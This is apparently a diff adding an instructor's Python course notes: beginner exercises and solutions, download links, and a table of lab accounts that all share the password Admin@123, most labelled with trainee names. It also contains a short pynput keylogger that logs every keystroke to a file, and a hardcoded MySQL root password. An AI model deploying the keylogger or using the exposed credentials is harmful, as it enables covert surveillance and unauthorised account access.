@@ -1,0 +1,1038 @@
+
+################################### post test ################
+https://forms.office.com/r/jSpyWAYE4R
+############################################################
+
+
+
+
+https://notepad.pw/trdRRMHqm3kj1u1FYwhF
+
+https://googlechromelabs.github.io/chrome-for-testing/#stable
+
+
+https://dev.mysql.com/get/Downloads/MySQLInstaller/mysql-installer-community-8.0.41.0.msi
+---------------------------------------
+https://github.com/giridhar276/evernorth
+---------------------------------------
+
+
+
+user61	Admin@123	https://labs.dmrtechcloud.com Gregory
+user62	Admin@123	https://labs.dmrtechcloud.com - Santhosh
+user63	Admin@123	https://labs.dmrtechcloud.com - Shakti
+user64	Admin@123	https://labs.dmrtechcloud.com
+user65	Admin@123	https://labs.dmrtechcloud.com -Srinija
+user66	Admin@123	https://labs.dmrtechcloud.com - 
+user67	Admin@123	https://labs.dmrtechcloud.com - Chakradhar
+user68	Admin@123	https://labs.dmrtechcloud.com -Renusha
+user69	Admin@123	https://labs.dmrtechcloud.com - jaganatha raju
+user70	Admin@123	https://labs.dmrtechcloud.com - Gangireddy
+user71	Admin@123	https://labs.dmrtechcloud.com
+user72	Admin@123	https://labs.dmrtechcloud.com - Meghana
+user73	Admin@123	https://labs.dmrtechcloud.com 
+user74	Admin@123	https://labs.dmrtechcloud.com - Vineela  
+user75	Admin@123	https://labs.dmrtechcloud.com - Giri
+user76	Admin@123	https://labs.dmrtechcloud.com
+user77	Admin@123	https://labs.dmrtechcloud.com Raghav
+user78	Admin@123	https://labs.dmrtechcloud.com - Jayrath
+user79	Admin@123	https://labs.dmrtechcloud.com-Sukrutha
+user80	Admin@123	https://labs.dmrtechcloud.com - Naveen
+user81	Admin@123	https://labs.dmrtechcloud.com - Tarun Kumar
+user82	Admin@123	https://labs.dmrtechcloud.com - SHIRISHA PULIGILLA
+user83	Admin@123	https://labs.dmrtechcloud.com -Durga Bhavani
+user84	Admin@123	https://labs.dmrtechcloud.com - Siva
+user85	Admin@123	https://labs.dmrtechcloud.com - SATISH
+user86	Admin@123	https://labs.dmrtechcloud.com MOURYA
+user87	Admin@123	https://labs.dmrtechcloud.com 
+user88	Admin@123	https://labs.dmrtechcloud.com sanjana
+user89	Admin@123	https://labs.dmrtechcloud.com Deepika
+user90	Admin@123	https://labs.dmrtechcloud.com Yash
+
+
+
+from pynput.keyboard import Key, Listener
+import logging
+import os
+
+logdir = os.getcwd()
+logging.basicConfig(filename = ("output.txt"), level = logging.DEBUG)
+
+
+def on_press(key):
+    logging.info(key)
+
+# Collect events until released
+with Listener( on_press=on_press) as listener:
+    listener.join()
+
+
+
+name = "python programming"
+print(name)
+print("I love",name)
+#slicing  # string[star:stop:step]
+print(name[0])
+print(name[1])
+print(name[0:8])
+print(name[0:8:1])
+print(name[0:17:2])
+print(name[::5])
+print(name)
+print(name[::])
+print(name[:])
+print(name[-1])
+print(name[-5:-2])
+print(name[::-1])
+
+name = "python programming"
+print(name.upper())
+print(name.capitalize())
+print(name.title())
+print(name.count("p"))
+print(name.startswith("p"))
+
+if name.startswith("p") :
+    print("string is upper")
+    print("inside if")
+    print("still if cond")
+else :
+    print("string is lower")
+    print("inside else")
+    print("still inside else")
+print("out of block")
+
+aname ="python programming language"
+print(aname.split(" "))
+
+print(name.find("prog"))  # check for substring # substring is find... returns starting index
+                          # if substring is not found.. it returns -1
+
+if 'prog' in name:        # check for substring
+    print("substring exists")
+else:
+    print("not found")
+
+
+# string replace
+print(name.replace("python","java"))
+print(name)
+name = name.replace("python","java")  # permanenent replacment
+
+aname = " python  "
+print(len(aname))
+print(len(aname.strip()))  # remove whitespaces at both ends
+print(len(aname.rstrip())) # rightside
+print(len(aname.lstrip())) # leftside
+
+
+
+
+
+
+book = {"chap1":10,"chap2":20,"chap3":30}
+print(book)
+# display individual value
+print(book["chap1"])  # 10
+# create chap4-40, chap5-50
+book["chap4"] = 40
+book["chap5"] = 50
+print(book)
+if "chap6" in book:
+    print("key exists")
+else:
+    print("not found")
+# check value
+if 10 in book.values():
+    print("value exists")
+print("keys:", book.keys())
+print("values :", book.values())
+print("items:",book.items())
+# book.pop(key)  # key,value both will be removed
+book.pop("chap1")  # chap1:10 will be removed from dict
+print(book)
+book.popitem()
+print(book)
+book.popitem()
+print(book)
+#book.pop(10)
+newbook = {"chap8":80,"chap9":90}
+finalbook = {**book,**newbook}
+print(finalbook)
+book.update(newbook)
+print(book)
+print(newbook)
+
+
+#print(book["chap100"])
+print(book.get("chap100")) # If Key is not found.. returns None
+
+
+
+
+#########
+{
+    "glossary": {
+        "title": "example glossary",
+		"GlossDiv": {
+            "title": "S",
+			"GlossList": {
+                "GlossEntry": {
+                    "ID": "SGML",
+					"SortAs": "SGML",
+					"GlossTerm": "Standard Generalized Markup Language",
+					"Acronym": "SGML",
+					"Abbrev": "ISO 8879:1986",
+					"GlossDef": {
+                        "para": "A meta-markup language, used to create markup languages such as DocBook.",
+						"GlossSeeAlso": ["GML", "XML"]
+                    },
+					"GlossSee": "markup"
+                }
+            }
+        }
+    }
+}
+
+
+
+
+
+
+###########################################
+
+
+
+############################
+
+info = {
+"id": "0001",
+"type": "donut",
+"name": "Cake",
+"image":
+{
+"url": "images/0001.jpg",
+"width": 200,
+"height": 200
+},
+"thumbnail":
+{
+"url": "images/thumbnails/0001.jpg",
+"width": 32,
+"height": 32
+}
+}
+
+
+sample output:
+
+ID              : 0001
+TYPE            : donut
+NAME            : Cake
+IMAGE URL       :"images/0001.jpg
+IMAGE WIDTH     : 200
+IMAGE HEIGHT    : 200
+THUMBNAIL URL   : "images/thumbnails/0001.jpg"
+THUMBNAIL WIDTH : 32
+THUMBNAIL HEIGHT:  32
+
+
+
+info = {
+"id": "0001",
+"type": "donut",
+"name": "Cake",
+"image":
+{
+"url": "images/0001.jpg",
+"width": 200,
+"height": 200
+},
+"thumbnail":
+{
+"url": "images/thumbnails/0001.jpg",
+"width": 32,
+"height": 32
+}
+}
+
+
+-----------
+
+
+list= [
+  {
+    "login": "mojombo",
+    "id": 1,
+    "node_id": "MDQ6VXNlcjE=",
+    "avatar_url": "https://avatars0.githubusercontent.com/u/1?v=4",
+    "gravatar_id": "",
+    "url": "https://api.github.com/users/mojombo",
+    "html_url": "https://github.com/mojombo",
+    "followers_url": "https://api.github.com/users/mojombo/followers",
+    "following_url": "https://api.github.com/users/mojombo/following{/other_user}",
+    "gists_url": "https://api.github.com/users/mojombo/gists{/gist_id}",
+    "starred_url": "https://api.github.com/users/mojombo/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/mojombo/subscriptions",
+    "organizations_url": "https://api.github.com/users/mojombo/orgs",
+    "repos_url": "https://api.github.com/users/mojombo/repos",
+    "events_url": "https://api.github.com/users/mojombo/events{/privacy}",
+    "received_events_url": "https://api.github.com/users/mojombo/received_events",
+    "type": "User",
+    "site_admin": False
+  },
+  {
+    "login": "defunkt",
+    "id": 2,
+    "node_id": "MDQ6VXNlcjI=",
+    "avatar_url": "https://avatars0.githubusercontent.com/u/2?v=4",
+    "gravatar_id": "",
+    "url": "https://api.github.com/users/defunkt",
+    "html_url": "https://github.com/defunkt",
+    "followers_url": "https://api.github.com/users/defunkt/followers",
+    "following_url": "https://api.github.com/users/defunkt/following{/other_user}",
+    "gists_url": "https://api.github.com/users/defunkt/gists{/gist_id}",
+    "starred_url": "https://api.github.com/users/defunkt/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/defunkt/subscriptions",
+    "organizations_url": "https://api.github.com/users/defunkt/orgs",
+    "repos_url": "https://api.github.com/users/defunkt/repos",
+    "events_url": "https://api.github.com/users/defunkt/events{/privacy}",
+    "received_events_url": "https://api.github.com/users/defunkt/received_events",
+    "type": "User",
+    "site_admin": False
+  }
+]
+
+write a a program to display all the keys and values.
+
+
+for info in data:  # data is the list
+    for key,value in info.items():  # info is the dictionary
+        print(key.ljust(15),":",value)
+
+
+######################################################
+
+
+colors = [
+{
+"colors": "red",
+"values": "#f00"
+},
+{
+"colors": "green",
+"values": "#0f0"
+},
+{
+"colors": "blue",
+"values": "#00f"
+},
+{
+"colors": "cyan",
+"values": "#0ff"
+},
+{
+"colors": "magenta",
+"values": "#f0f"
+},
+{
+"colors": "yellow",
+"values": "#ff0"
+},
+{
+"colors": "black",
+"values": "#000"
+}
+]
+
+
+
+write a program to display all the colors and its values.
+
+sample output :
+
+red #f00
+green #0f0
+yellow  #ff0
+magenta #f0f
+..
+..
+..
+
+
+for item in colors:
+    print(item['colors'].ljust(10), item['values'])
+
+
+
+####################################################
+
+
+
+
+
+data = {
+    'Sales': {
+        'North': {
+            'Alice': 'Manager',
+            'Bob': 'Sales Executive',
+            'Eve': 'Sales Coordinator',
+            'John': 'Account Manager'
+        },
+        'South': {
+            'Charlie': 'Sales Executive',
+            'Grace': 'Regional Sales Manager',
+            'Mallory': 'Business Development Associate'
+        },
+        'West': {
+            'Oscar': 'Sales Executive',
+            'Peggy': 'Account Executive',
+            'Victor': 'Territory Sales Manager'
+        }
+    },
+    'Marketing': {
+        'Digital': {
+            'David': 'SEO Specialist',
+            'Hannah': 'Content Strategist',
+            'Irene': 'Social Media Manager'
+        },
+        'Offline': {
+            'Eve': 'Event Coordinator',
+            'Jake': 'Brand Manager',
+            'Liam': 'Public Relations Specialist'
+        },
+        'Research': {
+            'Mia': 'Market Research Analyst',
+            'Noah': 'Customer Insights Manager'
+        }
+    },
+    'IT': {
+        'Infrastructure': {
+            'Quinn': 'Network Engineer',
+            'Riley': 'System Administrator',
+            'Sam': 'Cloud Architect'
+        },
+        'Development': {
+            'Tina': 'Software Engineer',
+            'Uma': 'Backend Developer',
+            'Walter': 'Full Stack Developer'
+        }
+    },
+    'HR': {
+        'Recruitment': {
+            'Yara': 'Recruitment Specialist',
+            'Zane': 'Talent Acquisition Manager',
+            'Nina': 'HR Coordinator'
+        },
+        'Employee Relations': {
+            'Oliver': 'Employee Relations Specialist',
+            'Sophia': 'HR Business Partner'
+        }
+    },
+    'Finance': {
+        'Accounting': {
+            'Xander': 'Accountant',
+            'Yvette': 'Accounts Payable Specialist',
+            'Zara': 'Financial Analyst'
+        },
+        'Audit': {
+            'Luna': 'Internal Auditor',
+            'Mason': 'Compliance Officer'
+        }
+    }
+}
+
+
+write a program to display the below output:
+
+
+Sales
+-----
+North
+South
+West
+
+
+Marketing
+--------
+Digital
+Offline
+Research
+
+
+IT
+---
+Infrasturcture
+Development
+
+HR
+---
+Recruitment
+Employee Relations
+
+
+
+for key in data:
+    print(key)
+    print("------")
+    for subkey in data[key]:
+        print(subkey)
+    print()
+
+
+
+
+
+
+
+#######################################################
+write a program to display the below output
+
+
+192.168.0.1
+192.168.0.2
+192.168.0.3
+..
+..
+..
+192.168.0.100
+
+
+
+for val in range(1,101):
+    ip = "192.168.0." + str(val)
+    print(ip)
+
+for val in range(1,101):
+    print("192.168.0.{}".format(val))
+    
+
+
+
+#######################################################
+
+write a program to display the below output
+
+
+192.168.0.1
+192.168.0.2
+192.168.0.3
+..
+..
+.. 192.168.0.100
+192.168.1.1
+192.168.1.2
+192.168.1.3
+..
+..
+..
+192.168.1.100
+
+
+
+
+for val in range(0,2):
+    for ival in range(1,101):
+        ipaddr = "192.168.{}.{}"
+        print(ipaddr.format(val,ival))
+
+#######################################################
+
+
+write a program to read username and password from the keyboard  and validate the password with below conditions
+
+1. password should be in upper case
+2. length of the password should be 6 characters
+3. password should not contain $ and & 
+
+If all the above conditions are valid ... display it as "valid password"
+
+#######################################################
+
+
+
+
+
+
+write a program to read employeeinfo.csv and display all the files from the file
+
+
+# reading the file line by line
+# fobj acts like an cursor or reference or pointer
+with open("languages.txt") as fobj:
+    # reading the file line by line
+    for line in fobj:
+        print(line.strip())
+
+# if the file is in different path
+#with open("C:\\Users\\Admin\\Desktop\\testprograms\\languages.txt","r") as fobj:
+#with open("C:/Users/Admin/Desktop/testprograms/languages.txt","r") as fobj:
+with open(r"C:\Users\Admin\Desktop\testprograms\languages.txt","r") as fobj:
+    for line in fobj:
+        print(line)
+
+
+#######################################################
+
+write a program to read employeeinfo.csv and display workclass and education columns only
+
+
+#######################################################
+
+write a program to read employeeinfo.csv and display all the UNIQUE work classes.
+
+Output:
+State-gov
+Private
+Self-employee
+..
+..
+..
+
+
+
+
+import csv
+workset = set()
+try:
+    with open("employeeinfo.csv") as fobj:
+        header = fobj.readline()  # skipping the first line as it is header
+        reader = csv.reader(fobj)
+        # processing
+        for line in reader:
+            workclass = line[1]
+            #print(workclass)
+            workset.add(workclass)
+        # displaying output
+        print("--- workclasses----")
+        for item in workset:
+            print(item)
+
+except Exception as err:
+    print(err)
+
+################# using dictionary
+import csv
+workdict = dict()
+try:
+    with open("employeeinfo.csv") as fobj:
+        header = fobj.readline()  # skipping the first line as it is header
+        reader = csv.reader(fobj)
+        # processing
+        for line in reader:
+            workclass = line[1]
+            #print(workclass)
+            workdict[workclass] = 1    # {"private":1 ,"public":1}
+        # displaying output
+        print("--- workclasses----")
+        for item in workdict:
+            print(item.strip())
+
+except Exception as err:
+    print(err)
+    
+    
+
+
+#######################################################
+
+write a program to display the below output
+
+Total male count  : 345 times
+Total female count:  455 times 
+
+
+
+
+#######################################################
+
+write a program to read employeeinfo.csv and display all the UNIQUE work classes and occurence of each time.
+
+Output:
+State-gov is repeated for 123 times
+Private  is repeated for 456 times
+Self-employee is repeated for 743 times
+..
+..
+..
+
+
+#######################################################
+
+write a program to read employeeinfo.csv and consider native-country column.
+
+replace all the lines containing  United-States with USA  and write the final output to newemployeeinfo.csv
+
+
+
+
+
+import csv
+workdict = dict()
+try:
+    with open("employeeinfo.csv") as fobj:
+        with open("newempinfo.csv","w") as fw:
+            header = fobj.readline()  # skipping the first line as it is header
+            for line in fobj:
+                if " United-States" in line:
+                    line = line.replace(" United-States","USA")
+                fw.write(line)
+
+except Exception as err:
+    print(err)
+
+#######################################################
+
+#######################################################
+
+#######################################################
+
+
+#######################################################
+
+
+################################### frequently used builtin libraries #############################
+
+os         : os level activities
+math       : mathematical operations
+sys        :  sys and python config data
+shutil     : copy,move, rmtree  etc
+urllib     : read the web, downloading the files
+logging    : logging all the events
+smtplib    : sending the mails
+ftplib     : performing ftp operations
+sysconfig  :  sys and python config data
+zipfile    : create/extract the zip files
+rarfile    : create/extract the rar files
+cryptopgraphy : encrypting and decrypting the data or files
+tarfile    : create/extract the tar files
+filecmp    : comparing files or directories
+sqlite3    : python default database
+csv        : reading/writing csv files
+xml        : reading/writing xml files
+calendar   : display month,year calendar info
+datetime   : working with date n time
+time       : working with date n time
+fractions  : working with decimal values
+glob       : display all the files
+heapq      : more of array operations ( getting largest among list )
+subprocess : executing system commands in python (  subprocess.getoutput("ls -ltr")
+pdb        : python debugger
+platform   : platform information
+random     : random operations ( shuffling , random digit ... )
+re         : grep + awk + sed
+socket     : networking programming
+stat       : stats of the file
+statistics : basic statistics
+pathlib	   : Object-oriented file path operations
+time	     : Delays, timestamps, performance checks
+logging	   : Logging for scripts/apps (replace print for real apps)
+argparse	 : Command-line interface (CLI) argument parsing
+configparser : 	Read/write .ini config files
+json	     :Serialize/deserialize JSON (common in APIs)
+uuid	     : Generate unique IDs (useful in files, databases)
+statistics	:Basic stats: mean, median, stdev
+random	    :Random number generation, sampling
+collections	:Specialized containers (defaultdict, Counter, namedtuple)
+traceback	   :Print/format exception tracebacks
+warnings	   :Raise and handle warnings
+
+#################################################################################################
+
+
+#######################################################
+
+
+
+import csv
+workdict = dict()
+try:
+    with open("employeeinfo.csv") as fobj:
+        with open("newempinfo.csv","w") as fw:
+            header = fobj.readline()  # skipping the first line as it is header
+            for line in fobj:
+                if " United-States" in line:
+                    line = line.replace(" United-States","USA")
+                fw.write(line)
+
+except Exception as err:
+    print(err)
+    
+    
+    
+    
+    
+#########################################################################################################
+
+
+write a script to create 10 directories in the current directory as below.
+
+dir1
+dir2
+dir3
+dir4
+..
+..
+dir10
+
+
+import os
+try:
+    dirname = "dir"
+    for val in range(1,11):
+        os.mkdir( dirname + str(val))
+except Exception as err:
+    print(err)
+
+#########################################################################################################
+
+write a program to delete all the .csv files from the current directory
+
+
+import sys
+import os
+try:
+    for file in os.listdir():
+        if file.endswith(".csv"):
+            os.remove(file)
+            print(file,"is deleted")
+except Exception as err:
+    print(err)
+    print(sys.exc_info())
+    
+    
+#########################################################################################################
+
+Write a script that lists all files and directories in the current working directory line by line.
+
+import os
+for file in os.listdir():
+    print(file)
+
+#########################################################################################################
+
+write a script to perform the below operations :
+
+1. display current working directory
+2. display login name
+3. display all environment variables
+4. display today's date ( timestamp )
+5. display sep months calendar
+6. display all .py files and its size in bytes
+7. display the modified time of employees.csv file
+8. display current process id
+9. set an environment variables. ( Eg.    TEST_PATH = "C:/Users/Admin/")
+10. Lock and unlock a file using os.open and os.close
+11. Retrieve the current system's load average.
+
+
+import datetime
+import os
+import time
+import calendar
+
+print("current working directory:", os.getcwd())
+print("login name :", os.getlogin())
+
+#print(os.environ)
+for key,value in os.environ.items():
+    print(key,value)
+    print("----------")
+print(datetime.datetime.now())
+print(datetime.date.today())
+print(time.time())  # epoch time
+print(time.strftime("%d%b%Y"))
+print(time.strftime("Date :%d year: %Y Month: %b"))
+print(calendar.calendar(2025))
+print(calendar.month(2025,3))
+for file in os.listdir():
+    if os.path.isfile(file):
+        print(file.ljust(20) , os.path.getsize(file),"bytes")
+
+
+output = os.path.getmtime("test.py")
+print(time.localtime(output))
+print(datetime.datetime.fromtimestamp(output))
+
+#########################################################################################################
+
+write a script to display the below information ( psutil library)
+
+1. CPU percentage
+2. Memory info ( total memory, available, used)
+3. process info
+4. disk partitions
+5. network statistics
+
+
+
+import psutil
+
+print(psutil.cpu_percent())
+
+print(psutil.virtual_memory())
+
+print(psutil.disk_partitions())
+print(psutil.disk_usage("C:\\"))
+
+print(psutil.net_connections())
+
+
+#########################################################################################################
+
+write a program to display the below output and also write the output to a text file
+
+Python version
+
+Platform
+
+Compiler used
+
+#########################################################################################################
+
+write a program to display the below output
+
+boot time of the system 
+list of processes that are currently running and display the output
+ip address
+hostname
+
+
+
+
+#########################################################################################################
+write a program to read companies.txt and check whether below urls are accesible or not. 
+If the status is 200 display url is up.
+
+companies.txt
+--------------
+https://www.tcs.com/
+https://www.wikipedia.org/
+https://www.telangana.gov.in/
+https://www.india.gov.in/
+https://www.oracle.com/
+
+output:
+https://www.tcs.com/  is live
+https://www.wikipedia.org/  is live
+https://www.tẻlangana.gov.in/ is not working
+https://www.india.gov.in/ is not working
+https://www.oracle.com/ is live
+
+
+
+
+
+
+#########################################################################################################
+
+from bs4 import BeautifulSoup
+import requests
+try:
+    # step1 : capture html code
+    
+    url = "https://www.wikipedia.org/"
+
+    response = requests.get(url)
+    if response.status_code == 200:
+        content = response.text
+        #print(content)
+        soup = BeautifulSoup(content, 'html.parser')
+        for link in soup.find_all('a'):
+            print(link.get('href'))
+    else:sys
+        print("Unable to access ",url)
+
+    #step2 : use bs4 library and display all the URLs from html page
+except Exception as err:
+    print(err)
+
+
+#########################################################################################################
+
+write a program to read employeesinfo.csv and insert all the records to the database  ( file to database )
+
+-use validations  check whether the employeesinfo.csv is existing is not
+-try expect blocks
+- check whether the file size is greater than 0 or not.
+
+
+
+
+
+
+#########################################################################################################
+
+write a program to connect to the database table and write the output to the excel file  ( database to excel file)
+
+- excel file should be today's timestamp
+
+
+
+import pymysql
+from openpyxl import Workbook
+import time
+wb = Workbook()
+ws = wb.active
+try:
+    #step1
+    conn = pymysql.connect(host ="localhost",port=3306 ,user="root",password="giri@123")
+    excelfile = time.strftime("%d_%b_%Y.xlsx")   # excelfile
+    if conn:
+        cursor = conn.cursor() # cursor is used to navigate between the records
+        #step2
+        query = "select * from empdb.employees"
+        #step3
+        cursor.execute(query)
+        #step4
+        ws.append(["workclass","education","gender"])
+        for record in cursor.fetchall():
+            ws.append(record)
+        #step5
+        conn.close()
+        wb.save(excelfile)
+    else:
+        print("connection failed")
+except Exception as err:
+    print(err)
+
+
+
+#########################################################################################################
+
+#########################################################################################################
+
+
+#########################################################################################################
+
+
+#########################################################################################################
+
+
+
+#########################################################################################################
+
+
+
+
+#########################################################################################################
+
+
+
+#########################################################################################################
+
+#########################################################################################################
+
+
+#########################################################################################################
+
+
+#########################################################################################################
+
+
+https://storage.googleapis.com/chrome-for-testing-public/134.0.6998.165/win64/chromedriver-win64.zip
+
+
+
+
+
